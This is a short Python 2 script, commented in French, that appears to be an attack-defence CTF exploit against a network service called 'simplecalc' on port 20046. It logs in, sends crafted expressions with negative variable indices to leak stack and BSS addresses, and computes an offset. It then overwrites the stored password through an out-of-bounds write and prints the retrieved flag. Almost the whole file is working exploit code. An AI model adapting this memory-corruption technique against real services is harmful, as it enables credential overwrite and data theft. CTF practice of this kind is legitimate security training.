#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, socket
import time

if len(sys.argv) != 3 :
    print("Exploit du service simplecalc\n\nUsage : " +  __file__ + " [hostname] [target]\n[target] est l'ID du flag de la team participant au CTF");
    exit();

host = sys.argv[1]
target = sys.argv[2]
port = 20046

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

try :
  time.sleep(0.1)
  init_ack = s.recv(1024)

  s.send(target+'\n')
  time.sleep(0.1)
  login_username_ack = s.recv(1024)

  s.send('1\n')
  time.sleep(0.1)
  login_password_ack = s.recv(1024)

  s.send('1\n')
  time.sleep(0.1)
  login_worktitle_ack = s.recv(1024)

  s.send('S\n')
  time.sleep(0.1)
  solve_init_ack = s.recv(1024)

  # Fuite des adresses du stack et du BSS
  s.send('V0=V-8+9008\n')
  time.sleep(0.1)
  s.send('V1=V-9-124\n')
  time.sleep(0.1)
  s.send('\n')
  time.sleep(0.1)
  solve_adresse_ack = s.recv(1024)

  s.send('R\n')
  time.sleep(0.1)
  retrieve_adresses= s.recv(1024)

  # Calcul de l'adresse à écraser
  password_addr_int = int(retrieve_adresses.split()[2])
  V0_addr_int = int(retrieve_adresses.split()[4])
  offset = str((V0_addr_int - password_addr_int)/4)

  s.send('S\n')
  time.sleep(0.1)
  solve_init_ack = s.recv(1024)

  # Ecrasement du mot de passe par *
  s.send('V-'+offset+'=V2+42\n')
  time.sleep(0.1)
  s.send('\n')
  time.sleep(0.1)
  solve_password_ack = s.recv(1024)

  s.send('R\n')
  time.sleep(0.1)
  retrieve_flag = s.recv(1024)
  print(retrieve_flag.split()[82])

except socket.error:
  print("Erreur lors de l'envoi")
  sys.exit()
